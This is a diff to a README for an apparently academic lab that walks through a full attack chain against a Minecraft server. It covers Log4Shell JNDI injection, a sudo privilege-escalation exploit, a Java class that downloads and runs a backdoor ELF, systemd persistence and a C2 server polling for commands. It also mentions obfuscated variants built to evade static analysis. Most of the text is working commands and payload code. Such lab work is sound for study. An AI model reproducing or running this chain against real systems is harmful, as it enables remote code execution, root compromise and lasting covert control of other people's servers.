@@ -8,13 +8,48 @@
 
 Log4Shell abuses Log4j's JNDI lookup feature. When Minecraft logs a chat message containing `${jndi:ldap://...}`, Log4j 2.14.1 processes it, reaches out to your LDAP server (marshalsec), which redirects it to your HTTP server hosting a malicious Java class. That class executes on the Minecraft server JVM.
 
-![Attack Diagram](images/Log4Shell.png)
+```mermaid
+sequenceDiagram
+    autonumber
+    
+    box rgb(255, 230, 230) Attacker Infrastructure
+    participant Client as Attacker Client
+    participant LDAP as Marshalsec LDAP (1389)
+    participant Web8888 as Payload HTTP (8888)
+    participant Web8000 as Payload HTTP (8000)
+    participant C2 as Docker C2 (5000)
+    end
+    
+    box rgb(230, 240, 255) Victim Infrastructure
+    participant Server as Minecraft Server (Victim)
+    participant Root as Root OS (sudo/systemd)
+    end
 
+    Client->>Server: 1. Send Chat: ${jndi:ldap://IP:1389/Beachhead}
+    Server->>LDAP: 2. JNDI Lookup for Beachhead
+    LDAP-->>Server: 3. HTTP Redirect to Beachhead.class
+    Server->>Web8888: 4. GET /Beachhead.class
+    Web8888-->>Server: Returns Beachhead.class
+    Note right of Server: JVM Executes Beachhead
+    Server->>Web8000: 5. Wget /Persistent.elf
+    Web8000-->>Server: Returns Backdoor ELF
+    Server->>Root: 6. Trigger PrivEsc (CVE-2025-32463)
+    Root-->>Server: Spawns root execution context
+    Server->>Root: 7. Write & Start systemd-cache.service
+    Note over Root,C2: Persistence Established
+    Root->>C2: 8. POST /checkin (Hostname)
+    loop Every 5 seconds
+        Root->>C2: 9. GET /command
+        C2-->>Root: {"command": "recon"}
+        Note right of Root: Executes locally
+        Root->>C2: POST /result (Output)
+    end
+```
 
 **Attack chain:**
 ```
 Minecraft chat input → Log4j 2.14.1 JNDI lookup → marshalsec LDAP server
-  → Python HTTP server → Exploit.class fetched → RCE on server
+  → Python HTTP server → Beachhead.class fetched → RCE on server → privilege escalation → Persistent.elf binary fetched → implant added to systemd service → C2 server connection
 ```
 ## A Deeper Dive
 
@@ -26,7 +61,7 @@ The first is a Log4J feature called **Lookups**. This feature allows logs to be 
 
 This combined with another 'feature', the ability to **query remote JNDI (Java Naming and Directory) servers** to fetch unknown classes. Input sanitization was not used for these logs, and a payload like:
 ```
-${jndi:ldap://127.0.0.1:1389/Exploit}
+${jndi:ldap://127.0.0.1:1389/Beachhead}
 ```
 
 would be interpreted by Log4J and reach out to the remote server, grab the implant class, and execute it on the host machine.
@@ -52,19 +87,26 @@ java -version
 # should show openjdk 17
 ```
 
-Must enable vulnerable version of sudo for our privilege escalation attack: 
+Next, clone this repository to your machine so you have all the necessary exploit files:
+```bash
+git clone https://github.com/newmie10/564Capstone.git ~/564Capstone
+cd ~/564Capstone/
 ```
-cd ~/log4j-lab/sudo/
+
+Next, you must build and enable the vulnerable version of `sudo` (CVE-2025-32463) required for our privilege escalation attack:
+```
+cd ~/564Capstone/sudo/
 ./configure
 make
 sudo make install
 ```
-Now set this sudo to your PATH; modern Ubuntu 25.10 uses sudo-rs which does not enable -R flag
 
+Set this vulnerable binary to your PATH (modern Ubuntu 25.10 uses sudo-rs which does not enable the vulnerable -R flag):
 ```
 export PATH=/usr/local/bin:$PATH
 ```
-You can test this exploit by executing the POC (learn more at CVE-2025-32463 - cool exploit) 
+
+You can verify the exploit works by executing the isolated test POC:
 ```
 ./../privesc/CVE-2025-32463-POC.sh
 ```
@@ -73,27 +115,24 @@ You can test this exploit by executing the POC (learn more at CVE-2025-32463 - c
 
 ## Directory Structure
 
-Everything lives under `~/log4j-lab/`:
+Now that you have cloned the repo and built the tools, you will be primarily working out of this hierarchy:
 
 ```
-~/log4j-lab/
-├── server/          # Minecraft server
-├── payload/         # Exploit.java and Exploit.class
-└── marshalsec/      # JNDI redirect server
-```
-
-```bash
-mkdir -p ~/log4j-lab/{server,payload}
+~/564Capstone/
+├── c2-server/       # Command & Control Docker container
+├── payload/         # Beachhead.java and Persistent.cpp
+├── privesc/         # sudo exploit
+└── server/          # Minecraft server
 ```
 
 ---
 
 ## Step 1 — Minecraft Server Setup (1.17)
 
-Download Minecraft 1.17 server jar from https://xyrios.com/minecraft/tools/mc-versions/1.17 and put it into ~/log4j-lab/server/. Do the same with the client jar and put it into ~/log4j-lab/client
+Download Minecraft 1.17 server jar from https://xyrios.com/minecraft/tools/mc-versions/1.17 and put it into ~/564Capstone/server/. Do the same with the client jar and put it into ~/564Capstone/client
 
 ```
-cd ~/log4j-lab/server
+cd ~/564Capstone/server
 
 ```
 
@@ -109,7 +148,7 @@ nano eula.txt
 Run the command again if needed.
 
 
-Start the server with `trustURLCodebase` enabled (not sure if necessary - will test in future:
+Start the server with `trustURLCodebase` enabled (not sure if necessary - will test in future):
 
 ```
 /usr/lib/jvm/java-17-openjdk-amd64/bin/java -Xmx1024M -Xms1024M \
@@ -153,38 +192,56 @@ Port number can be found in server folder under server.properties. Default is 25
 Open a new terminal:
 
 ```
-cd ~/log4j-lab/payload
-nano Exploit.java
+cd ~/564Capstone/payload
+nano Beachhead.java
 ```
 
 Paste the following:
 
 ```
-public class Exploit {
+public class Beachhead { ... }
+```
+
+*(Alternatively, you can copy the contents of `BeachheadObfuscated.java` provided in this repository, which employs ProGuard-style obfuscation to evade static analysis.)*
+public class Beachhead {
     static {
         try {
-            Runtime.getRuntime().exec("touch /tmp/pwned"); # replace with your bash payload, could be curl, wget, or straight exploit code. 
+            // Download the Persistent.elf backdoor and execute it
+            String[] cmd = {"/bin/bash", "-c", "wget -q http://127.0.0.1:8000/Persistent.elf -O /tmp/p && chmod +x /tmp/p && /tmp/p"};
+            Runtime.getRuntime().exec(cmd);
         } catch (Exception e) {}
     }
 }
 ```
 
-Compile it targeting Java 17 bytecode:
+Compile it targeting Java 17 bytecode (use the obfuscated filename if you chose that route):
 
 ```
-/usr/lib/jvm/java-17-openjdk-amd64/bin/javac Exploit.java
+/usr/lib/jvm/java-17-openjdk-amd64/bin/javac Beachhead.java
 ```
-Confirm both files exist:
+
+**[NEW] Compile the C++ Persistence Backdoor**
+You must compile the `Persistent.cpp` source code into an ELF binary before deploying. It is crucial to statically link it so it runs properly on the victim machine regardless of system libraries:
+
+```
+# NOTE: Update the 127.0.0.1 IP inside Persistent.cpp and Beachhead.java 
+# to your ATTACKER machine's IP if you are testing across a network!
+g++ -std=c++17 -static Persistent.cpp -o Persistent.elf
+```
+*(Alternatively, you can compile the obfuscated variant `PersistentObfuscated.cpp` if provided in your repository, which obfuscates API strings and polling loops).*
+
+Confirm the compiled files exist:
 
 ```
 ls
-# Exploit.java  Exploit.class
+# Beachhead.java  Beachhead.class  Persistent.elf
 ```
 
-Start the HTTP server to serve the payload — keep this terminal open:
+Start the HTTP servers to serve the payload on ports 8000 and 8888 — keep this terminal open:
 
 ```
-python3 -m http.server 8888
+python3 -m http.server 8000 &
+python3 -m http.server 8888 &
 ```
 
 ---
@@ -194,7 +251,7 @@ python3 -m http.server 8888
 Open a new terminal:
 
 ```
-cd ~/log4j-lab
+cd ~/564Capstone
 git clone https://github.com/mbechler/marshalsec
 cd marshalsec
 mvn clean package -DskipTests
@@ -203,9 +260,9 @@ mvn clean package -DskipTests
 Once the build finishes, start the LDAP redirect server per the marshalsec README:
 
 ```
-cd ~/log4j-lab/marshalsec
+cd ~/564Capstone/marshalsec
 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \
-  "http://127.0.0.1:8888/#Exploit"
+  "http://127.0.0.1:8888/#Beachhead"
 ```
 
 Expected output:
@@ -231,7 +288,7 @@ At this point you should have 4 terminals running, as well as the Minecraft clie
 In the Minecraft client, press **T** to open chat and send:
 
 ```
-${jndi:ldap://127.0.0.1:1389/Exploit}
+${jndi:ldap://127.0.0.1:1389/Beachhead}
 ```
 
 ---
@@ -242,21 +299,22 @@ Immediately watch your terminals:
 
 **Marshalsec terminal** should show:
 ```
-Send LDAP reference result for Exploit redirecting to http://127.0.0.1:8888/Exploit.class
+Send LDAP reference result for Beachhead redirecting to http://127.0.0.1:8888/Beachhead.class
 ```
 
-**Python HTTP server terminal** should show:
+**Python HTTP servers terminal** should show two separate downloads:
 ```
-127.0.0.1 - - [date] "GET /Exploit.class HTTP/1.1" 200 -
-```
-
-Then confirm the payload executed in terminal 4:
-
-```
-ls /tmp/pwned
+127.0.0.1 - - [date] "GET /Beachhead.class HTTP/1.1" 200 -
+127.0.0.1 - - [date] "GET /Persistent.elf HTTP/1.1" 200 -
 ```
 
-If the file exists, you have confirmed RCE.
+Then confirm the privilege escalation and payload execution was successful in your C2 Server terminal (Terminal 5):
+
+```
+docker logs -f capstone-c2-server-draft
+```
+
+You should see an incoming `[+] Check-in received` object containing your victim machine's hostname, followed by a `[+] Result received` block containing full automated recon data! Your reverse shell backdoor is now permanently installed via systemd and polling for future commands every 5 seconds.
 
 ---
 
@@ -265,8 +323,9 @@ Assuming you have already gone through the setup and build instructions above, y
 ```bash
 sudo apt install tmux -y
 ```
-Additionally make sure your Minecraft server, HTTP server, and LDAP servers are located at `~/log4jlab/`. Then run the script:
+Additionally make sure your Minecraft server, HTTP server, and LDAP servers are located within `~/564Capstone/`. Then run the script:
 ```bash
+cd ~/564Capstone
 ./quickstart.sh         # use this to open 5 separate window tabs
 ./quickstartsplit.sh    # use this to open all terminals split in one window
 ```
@@ -279,7 +338,7 @@ You will now have a tmux session with 5 windows:
 
 To quickly preview each pane use `ctrl+b w`. To switch windows use `ctrl+b [pane-number]`. If using split mode, use `ctrl+b o` to cycle through each pane or `ctrl+b [arrow-keys]` for directional switching.
 
-**Note:** Depending on the malicious class name you're using, you may need to edit the Marshalsec startup command in either script to use 127.0.0.1:1389/#YourClassName. The default class name is `Implant`.
+**Note:** Depending on the malicious class name you're using, you may need to edit the Marshalsec startup command in either script to use 127.0.0.1:1389/#YourClassName. The default class name is `Beachhead` which calls `Persistent.elf`.
 
 You may also clone this repository to directly download all relevant build files, but be forewarned that it may not compile or run correctly on your machine if you are using a different OS / VM or do not have the relevant Java version and all other necessary packages installed. 
 
@@ -291,6 +350,5 @@ You may also clone this repository to directly download all relevant build files
 | Marshalsec fires but Python gets no GET request | JVM not following LDAP redirect | Confirm `trustURLCodebase` flags are set on server launch |
 | `UnsupportedClassVersionError` | Wrong JDK for server jar | Use JDK 17 for the server, compile payload with direct java17 installation |
 | Flatpak fails for Prism | FUSE not supported in VM | Use the AppImage install method |
-| `/tmp/pwned` not created | Class loaded but not executed | Check that `Exploit.class` compiled correctly and is in the payload directory |
 
 ---
